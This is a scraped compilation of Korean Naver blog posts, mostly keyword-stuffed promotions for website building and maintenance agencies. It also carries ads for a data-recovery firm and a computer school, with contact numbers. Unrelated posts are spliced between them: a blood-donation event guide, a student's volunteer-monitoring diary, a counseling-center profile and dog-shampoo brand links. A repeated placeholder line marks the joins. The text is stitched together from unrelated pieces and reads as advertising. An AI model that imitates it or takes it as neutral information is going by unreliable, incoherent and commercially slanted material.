맨 앞에 업데이트 되는 창도 만들어보았습니다.이 페이지는 연구자료가 올라오는 게시판이 들어있는 페이지 입니다.회원가입 후에 이용할 수 있도록 회원 등급조정도 하고, 첨부파일을 올리고 다운로드 받을 수 있도록 신경을 썼답니다.아무래도 연구기관의 홈페이지다보니 자료들이 업로드되고 다운로드 되어야했는데,한참 기능에 대해 고민을하고 공부를 하던 중 좋은 플러그인을 발견해 구현시켰답니다. 단국대학교 대학원동에 위치하고 있는 단국대 국가위기관리연구소의 구글 맵입니다.꼭! 지도를 넣어달라는 의사를 반영했답니다.연구소가 개소한지 얼마 되지 않아 자료들이 별로 없어 처음 작업을 시작할 땐 막막했었습니다.로고도 직접 만들어서 넣었고, 색상이나 레이아웃들도 거의 새로 기획은 해야했었죠...하지만 작업을 하다보니 재미도 느끼고 보람도 느꼈습니다.국가를 위한 연구를 하는 곳의 홈페이지를 만든다니 조금 뿌듯하기도 했구요!시작하지 얼마 되지 않은 연구소지만 꼭 좋은 연구들 이어가시고 번창하셨으면 좋겠습니다.좋은 마음으로 작업할 수 있는 홈페이지였습니다.이상으로 포스팅을 마치겠습니다!   네이버 블로그는 맞지만, 확인불가  홈페이지제작및관리 깨알정보 홈페이지 부가서비스, 궁금하셨죠?    알아야 할 건 많은데, 이런저런 정보들은 넘쳐나죠?빠르게, 확실하게, 좋은 정보를 효율적으로 얻고 싶으실 텐데요.    오늘 제가 보여드릴 정보는 그런 분들을 위한 맞춤 정보라고 할 수 있겠습니다!    홈페이지제작및관리에 대한 정보~ 지금 바로 확인 하세요^^    홈페이지 방문자의 행동 양상과 경로, 접속한 페이지 등을 조사하는 도구로 로그분석 프로그램이라는 것이 있으며,    기본적인 솔루션형 홈페이지의 경우, 저렴한 가격으로 제작할 수 있지만디자인이나 팝업창, 텍스트 수정이 어려울 수 있습니다.따라서 업체와 사이트의 특성에 맞게 맞춤 홈페이지 관리가 필요하거나지속적인 관리가 필요한 홈페이지의 경우, 맞춤형 서비스를 사용하여 보는 것이 좋습니다로그분석은 웹페이지의 실적을 측정하기 위해 필요한 방문자 정보, 트래픽, 사이트 이동 경로 등의 데이터를 파악할 수 있는 분석 수단으로 이를 통해 사이트 보안이나 이벤트, 유입 전략 등을 구축할 수 있습니다.    부정클릭이란 광고비를 과하게 소진시키려는 악의적인 생각을 가지고 마구잡이로 클릭하는 것을 말하는데, 홈페이지 관리비가 많이 들어가므로 로그분석을 통해 확인하는 것이 좋습니다.        보안서버란 개인 정보의 유출과 해커가 중간에서 데이터를 가로채는 사항을 막고자,인터넷 고객들의 개인 자료들을 암호화, 복호화하여 전송하는 서버를 말합니다.현재 법적으로 이용자의 개인 정보 보호를 위해, 개인정보를 운영하는 모든 사이트는개인 정보 전송구간에 필수적으로 보안서버(SSL)를 설치해야 합니다.      홈페이지 제작 및 유지보수에 관해 반드시 명심할 것들!    근래에 홈페이지 제작할 때 가장 중요하게 생각하는 것이 바로 ‘꼴’입니다. 홈페이지 방문자의 시선을 끌기 위하여 네모, 동그라미 등의 ‘꼴’에 주목하여 페이지를 구성하고 있습니다.프리랜서 혹은 개인에게 사이트 주문을 맡기는 경우 빠른 피드백이 불가능한 경우가 많기 때문에 추후 관리가 어렵습니다 따라서 유지 보수가 불가능한 일회성 웹사이트 제작이라고 보아도 무방합니다.최근 인터넷에서 무료 사이트 제작이라는 선전 문구를 자주 볼 수 있습니다.이와 동일한 경우엔 초기 제작 비용을 무료로 하여 진행하긴 하지만 가장 다수의 디자인을 제공하기 때문에 결국에는 추가 금액으로 추가 옵션을 진행할 수밖에 없습니다.    홈페이지 제작 시에는 저렴한 초기 비용보다도 뚜렷한 유지 보수 및 관리가 더욱 중요합니다. 따라서 후자를 최우선적으로 지정해놓고 업체를 선정하시기 바라며        온라인페이지 최초로 제작할 경우에는 제작 원본을 꼭 받으셔야 합니다. 디자인 원본을 제공하지 않을 수도 있어 필히 시안 작업 시작 전 미리 인지하시기 바랍니다. 제작 원본이 있을 경우에는 이 후에 다른 업체를 통해서도 수정이 가능합니다.      컴퓨터 초보자도 금방 전문가 수준이 될 수 있다면 얼마나 좋을까?     어디서든 간편하게 학습할 수 있는 씨스꿀 컴퓨터스쿨에서는 가능합니다!    씨스꿀 컴퓨터스쿨은 여러 컴퓨터 프로그램 관련 인터넷 강좌를 제공합니다.9개월 69.000원/1년 89,000원/2년 129,000원만 내면 전 과목 무제한 반복 수강 가능!2년에 600여 강좌를 신규 제작 및 업데이트해 학습 지원을 풍부하게 해 드려요.저렴한 가격으로 배우고 기초부터 실무까지 활용돼요!    교안 및 실습파일/기출문제/모의고사 서비스 무료인 씨스꿀 컴퓨터스쿨로 오세요.휴학 복학 기간과 횟수에 제약이 없어 수강하기 쉽습니다.    사람들이 하는 걱정의 대부분은 일어나지 않은 일에 대한 것이나 지나간 일에 대한 걱정 등 지금 당장 해결할 수 없는 것들이 대부분이라고 하죠.그렇다고해서 해보지 않은 일에서 걱정을 하지는 마세요. 머릿속에 그리고만 있던 홈페이지제작및관리에 관한 생각도 오늘을 계기로 실행해 보기 바랍니다. 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가  2012년 제대하고부터 시작했던 대외활동들.마케팅서포터즈를 필두로하여 기자단, 봉사활동 등 다양한 대외활동을 했다. 이제 모두 추억으로 남은 시간들, 그리고 사람들. 2014년들어선 대외활동을 하지 않으려고했지만, 그래도 학업/일상에 지장을 주지 않을 정도로의 활동이 뭐 없을까하다가KOEM(해양환경관리공단)에서 모집하는 해양환경관리공단 홈페이지모니터링요원에 지원, 1기로서 활동하게 되었다.     KOEM 해양환경관리공단 홈페이지 모습.한창 블로그 흥할 때 지원한거라 괜히 뻘쭘. 블로그가 회생활 여지가 보이질 않는다. 음하핫.       하숙생활도 하겠다, 저학년이면 한 학기 진짜 재미나케 묵직한 활동하나 하고 싶은데 상황이 녹록지않아 아쉽다, 다만 내게 기회를 준 KOEM활동을 성실히 하는 것이 지금 내 위치에서 잘 할 수 있는 것일터.       간략히 이번 해양환경관리공단 홈페이지모니터링요원 활동에 대해 간략히 소개하자면,활동기간은 올해 6월까지 5개월 간이며 결과보고서를 통해 홈페이지모니터링 임무를 수행하게 된다.결과보고서 제출이 명목적인 미션수행 형태이지만, 이렇게 블로그나 다른 SNS이용한 홍보활동은 센스껏.활동혜택은 사실 별 볼일(?) 없다. 왜냐, 하는 일 또한 그러하므로! 욕심내지 않았기에 신경쓰이지 않는 부분이다.목표는 월별보고서 성실히 제출하여 수료하는 것! 음하하하하. 그러고서 최우수활동자가 되는 것! ㅋㅋㅋㅋ!       활동내용/활동혜택 및 수료기준에 대한 안내문서.활동혜택에 따른 보상은 비밀 :) 돈이 아니라 온누리상품권으로 준다는 점이 특이하다. 6월에 활동비를 정산 받으면 엄마에게 줘야겠다는 생각! 아무튼 화이팅!     네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가https://bloodinfo.net/event.do 소식&이벤트>이벤트>진행중 이벤트/캠페인 | 대한적십자사 혈액관리본부주요메뉴 바로가기 본문 바로가기 FOOTER 바로가기 패밀리 메뉴 후원 봉사 교육 RCY 병원 서비스 메뉴 대한적십자사 소개 사업소개 지사소개 ICRC IFRC 경영공시 글로벌링크 메뉴 로그인 회원가입 ENGLISH 브라우저 확대 설정 변경 + - 기본 주메뉴 영역 헌혈지식 헌혈참여 헌혈활동 기부금품/사회공헌 커뮤니티 소식&이벤트 홍보관 혈액관리본부 소개 주메뉴 전체보기 영역 전체메뉴 본문 영역 소식&이벤트 News / Event 공지사항 뉴스 이벤트 진행중 이벤트/캠페인 지난 이벤트/캠페인 이벤트 당첨자보기 home 소식&이벤트 ...bloodinfo.net   대한적십자사 혈액관리본부 홈페이지에서 5월에 많은 이벤트를 열고 있어서 한 번 블로그에도 글을 올려보겠습니다. 엄밀히 말씀드리면 4월부터 시작되었지만 5월에 참여해서 받을 수 있는 기념품이 훨씬 더 많습니다.​  <헌혈해봄 프로모션>이라는 캠페인입니다. 이 캠페인은 역사적 의의가 큽니다. 1960년 4.19혁명 당시 독재정권에 의해 부상당하는 시민들이 늘어나자 자발적으로 혈액을 기부하는 사람들이 등장했고, 1980년 5.18 민주화 운동에서 계엄군의 사격으로 시민들이 쓰러질 대 광주 곳곳에서 시민들이 줄을 서서 헌혈에 참여한 과거를 기억하기 위해 이벤트 기간을 올해 4월 19일부터 5월 18일까지 잡았습니다. 거의 한 개월이네요.​  여러 이벤트가 연속으로 있는데 헌혈의집이나 헌혈버스에서 헌혈하면 바로 증정하는 이벤트, 이외에 혈액관리본부 홈페이지에서 따로 신청해야 하는 이벤트가 있습니다.​ ​  먼저 이벤트 날짜 때 헌혈에 참여하면 현장에서 기념품을 받을 수 있는 이벤트부터 알아보겠습니다. 단 하루에만 참여할 수 있습니다.​ 1.  4월 22일 목요일(지구의 날) - 티트리 솔루션 블랙마스트 전국 선착순 6,000개  (이건 날짜가 지났죠.)​ 2. 5월 8일 토요일(어버이 날, 세계적십자의 날) - 링티 2포(레몬맛, 복숭아맛) + 보틀 1개) 전국 선착순 7,000개  * 링티는 찾아보니 음료수 제품 중 하나입니다. 이 이벤트는 당장 내일 있네요.​  3. 5월 13일 목요일(헌혈의 날) - 마시는 고려은단 비타민C 1000 전국 선착순 10,000개(1인당 2병 지급)  * 매월 13일이 헌혈의 날이라는 건 웬만한 헌혈자들이라면 아실 만한 정보일 것입니다.​ 4. 5월 18일 화요일(광주민주화운동 기념일) - 차콜 솔루션 블랙 마스크 전국 선착순 6,000개  * 역시 시국이 시국이다 보니 마스트 관련 기념품 이벤트가 2번이나 있네요.     다음은 혈액관리본부 홈페이지를 통해 신청하는 이벤트입니다. 이벤트 응모기간에 헌혈하신 다음 인터넷에서 신청하시면 됩니다.   5. <생명지킴 프로모션>   응모기간: 4월 21일 수요일 ~ 5월 18일 화요일   * 4월 19일 월요일부터 5월 18일까지 헌혈하신 다음 홈페이지를 통해 응모하시면 됩니다.  * 딱 1명 당첨되는 거라 경쟁률이 어마어마하겠네요.​​   6. <유전자 검사 프로모션>  응모기간: 5월 5일 수요일 ~ 5월 8일 토요일  * 응모기간(5월 5일 ~ 5월 8일) 내에 헌혈하신다음 홈페이지를 통해 참여하시면 됩니다.  * 이 이벤트도 내일까지네요. 필자는 5월 3일에 헌혈해서 아쉽게 참여를 못합니다. 만약 참여 조건이 되었다면 조금 더 알아보고 결정했을 것 같습니다.  * '혈통분석 유전자 검사' 라는 점이 생소한데 찾아보니 이 이벤트를 담당하는 'EDGC'라는 곳의 홈페이지가 나오네요. ( https://www.edgc.com/kor/bbs/board.php?bo_table=article&wr_id=132 )  EDGC유후(YouWho), 나이스검사 등 유전체분석과 EDGC-SCAN 액체생검진단을 주사업으로 2013년 설립되어 2018년 코스닥에 상장함.www.edgc.com ​ 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가드림인터페이스는 제가 근무하는 싸카스포츠와는 거의 20년가까이인연을 맺고있는 웹에이전시죠.저희회사 홈페이지제작 및 홈페이지개발 유지 관리를맡아주고 계신 드림인테페이스 사업설명회가 평내동 평내도서관에서 있다고해서 다녀왔습니다.   홈페이지제작, 쇼핑몰제작, 홈페이지개발, 쇼핑몰개발 업무연혁이 20년이 넘는 베테랑 기업입니다.2019년에는 정부 수출바우처 사업에 선정된 수출기업에 해외홈페이지,쇼핑몰, 모바일홈페이지, 모바일앱 등 필요서비스를 수행하는 기업으로 선정되기도 했다는군요.  드림인터페이스 김정욱대표님께서 직접 홈페이지제작과정과 쇼핑몰제작과정 소요비용등에 대해자세한 설명을 해주셨습니나.   홈페이지나 쇼핑몰제작에 관심이 있는 분들이 많이 오셨네요.  요즘 온라인 쇼핑몰을 운영하지않고서는 사업성공을 할 수 없는 시대임을 증명해주는것 같네요.   회사연혁소개~ 1998년 설립이래 2019년 현재까지 약 20여년을 홈페이지개발 및 제작 유지관리를 하는 오랜경력과 노하우 지닌 전문업체 입니다.   여러회사들의 홈페이지를 개발하고 제작 후 지금까지유지관리해주는 회사들도 상당히 많이 있습니다.     전문적인 분야라서 생소하고 어려운 단어들도 많았는데요.ㅎ   홈페이지제작에 대한 기획 기술적인부분 유지보수 및 비용부분등에 대해서도 자세히 설명해주셨습니다.  개발제작도 중요하지만 유지관리 보수도 엄청나게 중요한 부분이죠.   홈페이지 싸이트 개발 사례도 예로 들었는데요.   저희 회사 싸카스포츠의 싸이트가 예로 보이네요.  드림인터페이스 대표님이 제작한 자랑할만한 홈페이지싸카스포즈 사이트구경  한번 해보세요~~^^ 싸카닷컴-프리미엄축구 멀티스토어나이키 공식 온라인 축구 쇼핑몰 - 나이키, 푸마, 미즈노, 뉴발란스, 엄브로, 르꼬끄, 아스토레 축구용품(정품온라인 쇼핑몰)www.ssaka.com   모바일 홈페이지 어플리케이션 개발부분에 대한 설명도 이어집니다.모바일쇼핑몰이나 모바일홈페이지 제작의뢰가 늘어나고 있다고 해요.  모바일의 시대니까요.....   웹사이트 디자인 어워드 수상에이어 k-awards 모바일 어플리케이션부분 우수상도 수상하셨네요.드림인터페이스와 모바일액 개발어 우수한 기술력이 공식적으로 인정된 사례가되겠네요.   기존의 홈페이지를 모바일용으로 재구축하여 유지할수 있고 안드로이드, 애플, 사파리의 다양한 플랫폼 개발경험을 바탕으로 고객들의 모바일 e-Business 사업확장을 위한 최고의 기술파트너로 거듭나고 싶다는 대표님의 포부를 밝히시는군요.       홈페이지내 마케팅 참여사례도 보여주시네요.   저희 싸카스포츠 홈페이지를 20년가까이 관리해주고계시지만 솔직히 제분야가 아니기때문에 홈페이지제작, 관리, 유지보수에관해서는 전문적으로 잘 알지못했는데 드림인터페이스 대표님의 강의를 직접 듣고나니 오랜 파트너로 함께해온 이유를 알것 같습니다.​제대로된 홈페이지 쇼핑몰 제닥을 원하시면 드림인터페이스와 함께 하시기를 권해드리고 싶네요.비싼돈주고 홈페이지 잘 만들기만하면 뭐하나요!지속적인 유지관리 운영이 잘 되어야 하겠지요.오랜 경험과 노하우로 운영되어지는 드림인터페이스라면 믿고 의뢰해도 좋을것 같다는 생각이 듭니다.  홈페이지제작 및 개발전문업체 드림인터페이스 김정욱대표 드림인터페이스 김정욱대표02)2277-3030010-3729-0201​ 드림인터페이스홈페이지제작 전문업체웹에이전시/웹디자인웹사이트 개발 및 리뉴얼전문홈페이지 관리 유지보수드림인터페이스 - 홈페이지제작, 웹에이전시, 웹디자인, 웹사이트 개발 및 리뉴얼, 유지보수, 고급웹디자인, 웹기획, 웹개발드림인터페이스 - 홈페이지제작, 웹에이전시, 웹디자인, 웹사이트 개발 및 리뉴얼, 유지보수, 고급웹디자인, 웹기획, 웹개발www.dreaminterface.com 드림인터페이스서울특별시 성동구 성수동2가 315-61 성수역 SK V1 타워 17F  ​열음언어심리상담센터는 경기도 용인시 기흥구 마북로 47번길 9, 가온누리빌 B동 203호 에 위치한 심리상담 센터입니다.놀이치료, 언어치료, 양육코칭, 부부/가족 상담, 모래놀이치료, 아동청소년 심리상담 및 심리검사를 받을 수 있는 아담하고 따뜻한 분위기의 상담센터입니다.임영실 센터장님 외에 네분의 상담사님들께서 각 전공 분야를 살려 다양한 상담 서비스를 제공하고 계시는데요. 모래놀이치료, 언어치료 등은 인상적인 심리상담치료 방법이라는 생각을 했습니다.​이번에 저희 소상공인 디자인 지원사업을 통해 홈페이지 및 모바일페이지 디자인 지원을 받으셨고 결과에 만족하신다는 말씀을 듣게 되어 보람있었습니다. 홈페이지 관리방법에 어려움을 느끼시는 센터장님을 도와 앞으로 일정기간 추후 요청사항을 받아 지원할 예정입니다.​'마음을 열면 행복이 찾아온다'는 말 처럼 상담을 통해 마음을 열고 심리적 안정감과 행복감을 느끼는 분들이 많아졌으면 좋겠습니다.​열음언어심리상담센터 홈페이지는 https://www.yuleumcounseling.co.kr 입니다.용인시 소상공인 디자인 지원사업에 궁금하신 점 있으시면 http://dipasbd.cafe24.com/index.html 클릭또는 아래 전화번호로 문의해 주세요.​문의처: 디자인지원팀 손상혁 선임 031-323-3096​   ​ 네이버 블로그는 맞지만, 확인불가 너만 알고 있어! 홈페이지 제작 및 관리  확실하게 이해해보는 홈페이지 부가서비스에 대한 정보  안녕하세요. 홈페이지제작및관리에 관한 정보를 따라오셨군요?  맞아요. 어떻게든 관심을 가진 사람은 그렇지 않은 사람보다더 빨리 실용성있는 정보를 찾는 법입니다. 잘 방문하셨어요!!!    홈페이지제작및관리에 대해 궁금했던 사실을 이곳에서 풀어가시기 바랍니다.    맞춤형 홈페이지 제작은 인건비가 들기 때문에 솔루션형보다 가격이 더 나가지만, 필요한 기능을 따로 만들어주고, 전문적인 유지 보수를 해준다는 점에서 장점이 있는데요.    기본적인 솔루션형 홈페이지의 경우, 저렴한 금액으로 제작할 수 있지만디자인이나 팝업창, 수정이 어려울 수 있으니 맞춤 홈페이지 관리가 필요하거나지속적인 관리운영이 필요하다면, 맞춤형 서비스를 사용하여 보는 것이 좋답니다.전자 결제서비스의 경우, 결제시스템을 사용해서 카드결제나 실시간 계좌이체 등을 빠르게 확인 할 수 있고 매출의 집계나 결제 내역을 관리할 수 있어서 편리하죠.   부정클릭이란 광고비를 재빠르게 소진시키려는 악의적인 의도를 가지고  마구잡이로 클릭하는 것으로 로그분석을 통해 확인하는 것이 좋아요.  이 때 로그분석은 실적을 측정할 때 필요한 데이터를 파악할 수 있는 분석 수단으로  사이트 보안이나 유입 전략 등을 살펴볼 수 있다니 이 역시 참고하시는 것이 좋겠죠?   당연히 알아야 할 홈페이지 빌더 정보!    디자인 능력이나 프로그래밍 지식이 없어도 손쉽게 홈페이지를 만들 수 있는데요.홈페이지 빌더를 사용하면 기본 홈페이지 디자인 속에서 사용자가 알아서 내용과 사진을 수정할 수 있고, 주기적으로 홈페이지를 관리할 수도 있답니다.홈페이지 빌더는 짧은 기간에 편리하게 홈페이지를 만들 수 있는 서비스로원하는 스타일의 홈페이지 스킨을 고른 후 카테고리나 내용, 사진 등을 간단하게 수정하면 그 즉시 사용이 가능한 홈페이지를 개설할 수 있지요.   또한 사용자가 폰트나 이미지의 크기, 메뉴와 게시판 등 조절이 가능하여 홈페이지를 다양하고 자유롭게 디자인할 수 있다는 장점을 가지고 있죠.  뿐만 아니라 초보자나 쇼핑몰 창업을 생각하는 경우에도 홈페이지 빌더를 이용할 수 있어요. 이 때 추가적인 돈을 내면 더욱 특별한 모듈과 유료 디자인을 이용할 수 있으니 참고하세요!   간직하고 싶은 내 추억들이 들어있는 컴퓨터 데이터 복구를 원하시나요?검증된 실력과 정직함을 자랑하는 인젠데이타와 함께 하십시오!    인젠데이터는 컴퓨터를 비롯한 다양한 정보저장매체 데이터 복구 전문업체로서 20년 이상 경력을 갖춘 다양한 경험을 보유한 연구진들이 탁월한 데이터 복원 서비스를 제공합니다.최신 복구 기기와 자체 솔루션을 소유하고 있어 타사 대비 높은 복구율도 보장합니다.1:1 인터넷 맞춤형 무료 상담으로 내 컴퓨터의 문제점도 잡아낼 수 있는 기회!세계 최초 COB 복구기술 개발에 성공한 데이터 복구 업계 최고 전문인력의 프로페셔널한 서비스, 수 없이 많은 고객 후기로 실력을 검증받은 인젠데이타가 직접 보여 드리겠습니다.    금연하는 분들! 또는 달콤한 초콜릿과 탄수화물을 참아가면 살을 빼는 여러분!유혹과 짜증을 참느라 힘드시죠?. 이럴 때 마음을 채워주는 무언가가 있으면 조금이겨낼 만 하다고 합니다. 이렇게 다른 무언가로 채워가다 보면 정서적 결핍이 사라지는 날이 올 거예요!오늘 같이 본 홈페이지제작및관리! 여러분의 스트레스를 풀어줬기를 바라며 여기서 마칠게요! 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가  ​​   메이크홈즈 어서 빨리 홈페이지 제작 및 관리 이야기 차근히 읽어보세요!오직 당신을 위한 홈페이지 제작 및 관리 비용 줄이는 방법 관련 정보 A to Z​     ​저는 음악 중에서도 마음을 가라앉혀 주는 발라드나 경음악을 좋아하는 편입니다. 머리 속 생각을 다스리기 좋고, 기분을 좋게 해주어 또 다른 원동력이 되어줘서요!지금부터 소개할 홈페이지제작및관리 관련 정보도 여러분께 그런 음악이 되어주기 바랍니다~홈페이지 내 페이지 수가 많을 수록 높은 제작비용이 발생하게 되는데요.회사소개, 찾아오는길 처럼 비슷한 맥락의 메뉴를 심플하게 정리해 한 페이지로 통합한다면,페이지 수량이 적기때문에 제작 가격도 저렴해지고, 한눈에 보기 편해 관리도 쉽습니다.​템플릿 홈페이지 제작업체를 이용한다면 비용절감에 효과를 볼 수 있습니다.기업에서 주는 디자인 시안 중 마음에 드는 디자인을 선택하여 업종에 맞게 변경 제작하면제작기간이 단기간인 만큼 비용이 저렴하면서도 만족도가 높은 편입니다.​혹시나 선호하는 레이아웃과 컨셉이 있다면 맞춤형 홈페이지 제작업체에 요청하는 것도홈페이지 제작 비용을 감소시키는데 효과적입니다.이때 제작완료 후 레이아웃 수정 시 추가비용이 나올 수 있기 때문에 완성 전 디자인 시안을 꼼꼼히 체크하는 것이 바람직합니다.​홈페이지 내용을 수정해야 할 경우, 수정 페이지당 편집 비용이 발생하게 됩니다.관리 비용을 줄이기 위해 최초 제작비용 견적 시 페이지 편집 건수가 서비스로 들어 있는지 고려하며, 견적 비교 후 제작을 신청하는 것이 좋습니다.​​   ​홈페이지 제작 후에는 지속적인 관리를 위해 도메인, 호스팅, 검색엔진을 입력해야 합니다.보통 1년 단위로 등록해야 하기 때문에 12개월마다 관리 비용이 발생하게 되죠.이러한 등록비용을 돈을 받지 않고 제공해주는 업체를 쓰면, 홈페이지 관리 비용을 낮출 수 있어요.​​   ​   나만 몰랐던 홈페이지 제작 및 유지보수에 대한 꿀팁!     대부분의 사람들은 웹사이트 제작 완료 후 발생되는 유지 비용으로 도메인 및 호스팅 연장 비용만을 생각하는 경향이 많습니다.홈페이지 부분 수정 및 추가 또는 삭제의 경우에도 비용이 청구될 수 있으니 미리 검토하시기 바랍니다.​홈페이지 제작 업체와 계약을 할 때에 초기 시안 작업 및 검수부터 이후 수정 및 관리의 자세한 항목에 대하여 어떠한 조건으로 견적이 청구되는지 자세하게 검토하고업체와 협의를 통해 계약 내용 수정 및 추가를 거친다음 업체 계약을 진행하는 것이 가장 좋습니다.​특히나 저렴한 초기 금액보다도 확실한 유지 보수 및 관리가 더욱 중요합니다. 따라서 후자를 우선으로 지정해놓고 업체를 선정하시기 바랍니다.​그리고 웹페이지를 처음으로 제작할 경우에는 제작 원본을 꼭 받아야 합니다. 디자인 원본을 제공하지 않을 수도 있으므로 필수로 시안 작업 시작 전 미리 체크하시기 바랍니다. 제작 원본이 있을 경우에는 이 후에 다른 업체를 통해서도 수정이 가능합니다.​   ​프리랜서 혹은 개인에게 사이트 기획물을 맡기는 때는 빠른 피드백이 불가능한 경우가 많기 때문에 추후에 관리가 어렵습니다.이 경우, 유지 보수가 불가능한 일회성 웹사이트 제작이라고 보아도 무방합니다.​​   ​우리 가게를 더 쉽게, 더 효과적으로 홍보하는 방법! 제2의 집인 홈페이지를 제작하세요!비교 불가능한 품질을 갖춘 로고와 홈페이지를 제작해주는 메이크홈즈가 도와 드리겠습니다!​업체의 상품과 서비스를 철저히 분석해 더 보기 쉽게, 더 흥미가 일도록 제작해주는 곳!인스타그램 등 SNS를 이용한 다양한 광고마케팅도 시행해 홍보효과를 2배로 높여주는 곳!​퀄리티 대비 정직하고 낮은 견적으로 고객님의 마케팅 비용은 줄이고!신속정확한 일처리 및 유연한 피드백으로 홈페이지 제작 및 광고마케팅 만족도는 높여주고!​지금 바로 메이크홈즈에 문의하셔서 우리 업체를 더 많은 사람들이 볼 수 있게 해 보세요!홈페이지 제작 문의 상담번호 052-267-2027/ 010-3063-7993​   ​여기까지 전달해드린 홈페이지제작및관리에 관한 정보~ 유익하고 알차게 받아보셨나요?노력은 배신하지 않는다는 말을 기억하면서, 홈페이지제작및관리에 대한 정보를 완전정보하는 그날까지!앞으로 이어질 제 포스팅과 꾸준히~ 함께해 주시길 바라여 봅니다^^​   ​ 홈페이지관리 정말 중요하죠보통 홈페이지 제작만 신경쓰고 관리를 소홀히 하시는 사장님들이 의외로 많이 계십니다. 그럼 점점 사이트는 죽어가고 고객은 외면하게 되죠. 웹사이트도 강아지 키우는 것과 마찬가지 입니다. 밥을 주고 씻겨 주고 놀아주고 해야 하죠.  사장님들도 회사 홈페이지를 그렇게 관리 하셔야 합니다. 예를 들어 동일 지역에 A미용실과 B미용실이 있습니다. A는 홈페이지관리를 정성스럽게 하는 업체이고 B는 제작만 해놓고 방치만 하는 그런 업체입니다. A는 주기적으로 홈페이지에 고객이벤트를 정성껏 디자인 해서 공지하고 이메일,문자를 주기적으로 발송하여 고객에게 생동감 있는 모습을 보임으로서 수익이 극대화 되었습니다. 반대로 B는 남들이 하니까 나도 라는 심리로 제작을 하고 홈페이지관리를 전혀 하지 않았습니다.그 결과 수익에 전혀 도움이 되지 않고 오히려 역효과만 발생하였죠.  고객들은 웹사이트만 있다고 움직이지 않습니다.그 안에서 업체가 생동감 있게 고객들에게 어필하는 지를 살펴보죠.  기어다니는 홈페이지를 운영하고 싶으신가요? 아니면 날아다니는 홈페이지를 운영하고 싶으신가요? 홈페이지관리 정말 중요합니다. 상품 하나를 홈페이지에 올려도 사진 하나만 성의없이 올리는 그런 업체들도 많습니다. 그렇게 관리하시면 안됩니다. 상품이미지 하나에도 정성껏 디자인 편집이 들어가야 하고 그 내용 또한 고객이 세련되 보인다고 느낄 정도로 깔끔하고 세련되게 작업하여 올려야 합니다. 저희 홈페이지관리 전문 웹스푼은 서로간의 신뢰와 책임감을 가장 중요하게 생각하고 있습니다. 고객님에게 10년이상 경력 담당자가 심도 있게 상담을 해드리고 있습니다. 특히 홈페이지제작 또는 홈페이지관리에 관해 잘 모르시는 분들은 필히 연락주세요    잘 이해 되도록 천천히 상담해 드리겠습니다  ▽ 홈페이지관리 전문 웹스푼 홈페이지방문   애견샴푸도 종류가 무지 많지만 그나마 많이 애용되는 애견용 샴푸와 린스 및 컨디셔너는  아마도 아래 제품일듯 싶네요 바로 협성, 아일오브독, 에브리데이 제품입니다.그외 프루너스 제품이 많이 쓰시고 계신걸로 압니다. 저희집에서도 쭌이가 피부가 민감해서 프루너스 약용삼푸를 사용합니다.  회사마다 제품라인업이 워낙 다양하고 견종, 모색, 모질상태에 따라 골라야 되는 거라서일반적으로 많이 쓰이는 업체와 홈페이지 주소를 올립니다     제품 및 브랜드특징홈페이지협성로하스반려견의 모질에 모질상태에 따라 고를 수 있게끔 다양한 제품라인http://www.hyubsunglohas.com/아일오브독스협성보다 라인업은 단순하고 매니아 위주http://www.eaglevet.co.kr/02_sub/2c_proview.asp?Cate=00030001에브리데이순해서 자주 사용해도 됨http://www.eaglevet.co.kr/02_sub/2c_proview.asp?Cate=00040002프루너스약용샴푸가 많이 알려져있고 민감한 애들한테 잘 맞는듯(병원에서만 구매가능)http://www.chdmedics.com/   애견관리[피모] - 샴푸회사 홈페이지  http://blog.naver.com/gosoo777/30179824489애견관리[사료] - 사료회사 홈페이지 http://blog.naver.com/gosoo777/30159901100애견관리[피모]-말티즈, 푸들 털관리, 부분 삼푸, 엉킨털 풀기 http://blog.naver.com/gosoo777/30179836125    오픈캐스트를 구독하시면 네이버메인에서 말티 삼남매이야기를 볼 수 있어요http://opencast.naver.com/GS945(주소 클릭하시고 구독하면 됩니다)        네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가웹스푼의 홈페이지관리 오늘은 주변 경쟁사와의 홈페이지 비교글을 한번 올려 보겠습니다. 대부분 사장님들이 잘못 알고 계시는것이 홈페이지만 만들면 알아서 고객이 들어오고 전화를 하겠지라는 생각들을 가지고 계십니다. 그리고 홈페이지를 비싼돈을 들여 제작하고 방치를 하죠. 홈페이지관리에 전혀 신경을 안쓰십니다. 이렇게 되면 사장님들 홈페이지에 고객은 커녕 파리조차 얼씬도 안하죠. 일부 사장님들은 저에게 묻습니다. 홈페이지를 만들어 놨는데 왜 전화가 안올까요? 라고.. 저는 이렇게 대답을 드리죠. 홈페이지관리를 안하시기 때문이라고 답변드립니다.  그럼 홈페이지관리는 어떠한것이 있을까요? 여기에는 기본적인 게시판 관리, 이미지 수정, 이벤트 팝업 주기적인 관리 , 주기적인 고객 이벤트가 있고 여기에 고객마케팅이 추가됩니다. 마케팅을 위해서는 블로그관리 또한 필수인 시대죠. 또한 방문자가 홈페이지에 오래 머물게 하기 위해 홈페이지 컨텐츠의 구성이 알차게 되어 있어야 합니다. 고객이 원하는 방향은 시간이 지날 수록 매우 유동적이어서 경쟁업체보다 발빠르게 홈페이지 구성을 변경 시켜야만 합니다. 결국 홈페이지관리를 누가 어떻게 얼마나 빠르게 잘하느냐에 따라 경쟁업체보다 앞서 나갈 수 있겠죠. 또한 어렵게 잡은 고객을 타 경쟁사에 빼앗기지 않기 위해서는 고객이벤트를 주기적으로 하셔야 합니다. 이벤트페이지를 만들어 이메일 발송도 하고 홈페이지에 올리시기도 해야죠. 단 이벤트페이지 만들때는 정말 디자인이 중요합니다. 촌스러운 디자인으로 이벤트를 하면 오히려 역효과가 납니다.정말 할일도 많고 퀄리티도 높아야 제대로된 효과를 보실 수 있습니다. 이런 일을 경험없는 직원들이나 경력이 부족한 프리랜서들이 과연 할 수 있을까요?  경쟁사보다 앞서 가려면 경험이 많은 홈페이지 관리 담당자를 선정해야만 합니다. 지금도 늦지 않았습니다. 제대로 된 홈페이지관리를 이제 시작해 보세요. 사장님들의 사업을 업그레이드 시켜 보세요. 저희 홈페이지관리 전문 웹스푼은 서로간의 신뢰와 책임감을 가장 중요하게 생각하고 있습니다. 고객님에게 10년이상 경력 담당자가 심도 있게 상담을 해드리고 